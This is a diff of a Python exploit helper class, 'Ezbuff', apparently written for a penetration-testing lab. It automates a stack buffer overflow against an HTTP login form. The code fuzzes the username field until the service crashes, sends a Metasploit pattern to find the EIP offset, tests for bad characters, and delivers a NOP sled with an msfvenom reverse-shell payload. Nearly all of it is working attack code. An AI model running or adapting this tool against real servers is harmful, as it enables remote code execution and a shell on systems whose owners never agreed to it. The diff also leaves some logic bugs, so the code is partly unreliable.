@@ -58,14 +58,14 @@ class Ezbuff:
 		chars (str): All possible characters to test application for bad characters.
 	"""
 	nop_sled = r"\x90"*16
-	chars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
-"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
-"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
-"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
-"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
-"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
-"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+	chars = (r"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+r"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+r"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+r"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+r"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+r"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+r"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+r"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
 
 	def __init__(self, targ_ip, targ_port):
@@ -78,7 +78,7 @@ class Ezbuff:
 			_offset (int): Will store the integer returned by msf's pattern_offset file
 							that determines where the offset occured in the fuzzing process
 			_num_bytes_crash (int): The number of bytes it took to crash the system,
-									Note: the bytes are sent in increments of 50
+									Note: the bytes are sent in increments of 100
 			_receive_bytes (int): The number of bytes we will receive from the target machine at once
 			_jump_eip (str): Will store the four bytes necessary to overwrite eip register with jump command
 
@@ -122,7 +122,7 @@ class Ezbuff:
 
 
 	@property
-	def targ_ip(self):
+	def targ_ip(self) -> str:
 		"""Returns the current target's IP address"""
 		return self._targ_ip
 
@@ -132,10 +132,12 @@ class Ezbuff:
 		"""Sets a new IP addresses"""
 		self._targ_ip = new_IP
 
+
 	@property
-	def targ_port(self):
+	def targ_port(self) -> int:
 		"""Returns the target application port number"""
 		return self._targ_port
+
 
 	@targ_port.setter
 	def targ_port(self, new_port):
@@ -144,7 +146,7 @@ class Ezbuff:
 	
 	
 	@property
-	def bad_chars(self):
+	def bad_chars(self) -> str:
 		"""Return the bad characters set by user."""
 		return "".join(self._bad_chars_found)
 	
@@ -162,7 +164,7 @@ class Ezbuff:
 
 
 	@property
-	def num_bytes_crash(self):
+	def num_bytes_crash(self) -> int:
 		"""Returns the number of bytes it took to crash the application."""
 		return self._num_bytes_crash
 	
@@ -224,7 +226,19 @@ class Ezbuff:
 		else:
 			self._jump_eip = jump_mem_location
 
+	def _HTTP_header(self):
+		"""
+		"""
+		buff = "POST /login HTTP/1.1\r\n"
+		buff += f"Host: {self.targ_ip}\r\n"
+		buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+		buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+		buff += "Accept-Language: en-US,en;q=0.5\r\n"
+		buff += "Referer: http://10.11.0.22/login\r\n"
+		buff += "Connection: close\r\n"
+		buff += "Content-Type: application/x-www-form-urlencoded\r\n"
 
+		return buff
 	def fuzz(self, chars=None, reverse_payload=None):
 		"""Sends an incrementing number of bytes to an application
 		until it crashes or returns an error and then prints out the
@@ -236,64 +250,68 @@ class Ezbuff:
 			reverse_payload (bytes): Will store the contents of the msfvenom generated reverse shell
 									payload, default=None
 		"""
-
-		buff = "POST /login HTTP/1.1\r\n"
-		buff += "Host: 10.11.0.22\r\n"
-		buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
-		buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-		buff += "Accept-Language: en-US,en;q=0.5\r\n"
-		buff += "Referer: http://10.11.0.22/login\r\n"
-		buff += "Connection: close\r\n"
-		buff += "Content-Type: application/x-www-form-urlencoded\r\n"
-
-		self._num_bytes_crash = 50
-
-		soc = self._create_socket()
+		self._num_bytes_crash = 100
 
 		if not chars and not reverse_payload:
-			content = "username=" + 'A'*self._num_bytes_crash + "&password=A"
+			print(g + "[+]" + rst + " Intiating fuzzing procedure...")
+			while True:
+				content = "username=" + 'A'*self._num_bytes_crash + "&password=A"
+				buff = self._HTTP_header()
+				buff += f"Content-Length: {str(len(content))}\r\n"
+				buff += "\r\n"
+				buff += content
+
+				soc = self._create_socket()
+
+				with soc:
+					try:
+						print(b + "[+]" + f" Sending {self._num_bytes_crash} bytes..." + rst)
+						soc.send(bytes(buff, "utf-8"))
+						soc.close()
+						sleep(2)
+					except OSError:
+						print(f"Number of bytes sent at crash: {self._num_bytes_crash}")
+						self._num_bytes_crash -= 100
+					finally:
+						self._num_bytes_crash += 100
+		elif chars:
+			content = ("username=" + "A"*self.offset 
+				+ "B"*4
+				+ chars 
+				+ "C"*(self._num_bytes_crash-self.offset - 4 - len(Ezbuff.chars)) + "&password=A"
+			)
+			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
 			buff += content
+			print(buff)
 
-			print(g + "[+]" + rst + " Intiating fuzzing process...")
-			while True:
-				with soc:
-					try:
-						soc.send(buff)
-						soc.close()
-						sleep(10)
-					except OSError:
-						print(f"Number of bytes sent at crash: {self._num_bytes_crash}")
-						self._num_bytes_crash -= 50
-					finally:
-						self._num_bytes_crash += 50
-		elif reverse_payload:
-			content  = "A"*self.offset + self.jump_eip + Ezbuff.nop_sled + reverse_payload
+			soc = self._create_socket()
+
+			with soc:
+				print(b + "[+]" + rst + " Sending bad characters payload...")
+				try:
+					soc.send(bytes(buff, "utf-8"))
+				except OSError as err:
+					print(r + f" Socket Error: {err}" + rst)
+					exit(1)
+		else:
+			content  = ("username=" + "A"*self.offset 
+				+ self.jump_eip + Ezbuff.nop_sled 
+				+ reverse_payload 
+				+ "&password=A"
+			)
+			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
 			buff += content
 			with soc:
 				print(g + "[+]" + rst + " Sending reverse_shell payload...")
 				try:
-					soc.send(buff)
+					soc.send(bytes(buff, "utf-8"))
 				except OSError as err:
 					print(r + f" Socket Error: {err}" + rst)
 					exit(1)
-
-		else:
-			content = "A"*self.offset + "B"*4 + chars + "C"*(self._num_bytes_crash-self.offset - 4 - len(Ezbuff.chars))
-			buff += f"Content-Length: {str(len(content))}\r\n"
-			buff += "\r\n"
-			buff += content
-			with soc:
-				print(b + "[+]" + rst + " Sending bad characters payload...")
-				try:
-					soc.send(buff)
-				except OSError as err:
-					print(r + f" Socket Error: {err}" + rst)
-					exit(1)
-	
 
 	def send_msf_pattern(self):
 		"""
@@ -301,13 +319,14 @@ class Ezbuff:
 		payload = self._generate_msf_pattern()
 
 		soc = self._create_socket()
+
 		with soc:
 			bytes_payload = bytes(payload, "utf-8")
 			print(g + "[+]" + rst + " Sending Msfpattern payload...")
 			soc.send(bytes_payload)
 
 
-	def _generate_msf_pattern(self):
+	def _generate_msf_pattern(self) -> str:
 		"""
 		"""
 		output = sp.run(['/usr/share/metasploit-framework/tools/pattern_create.rb', self._num_bytes_crash])
@@ -349,7 +368,10 @@ class Ezbuff:
 		"""
 		"""
 		copy_chars = Ezbuff.chars
+		print(copy_chars)
+
 		for char in self._bad_chars_found:
+			char = "\\" + char
 			copy_chars.replace(char, "")
 		self.fuzz(copy_chars)
 
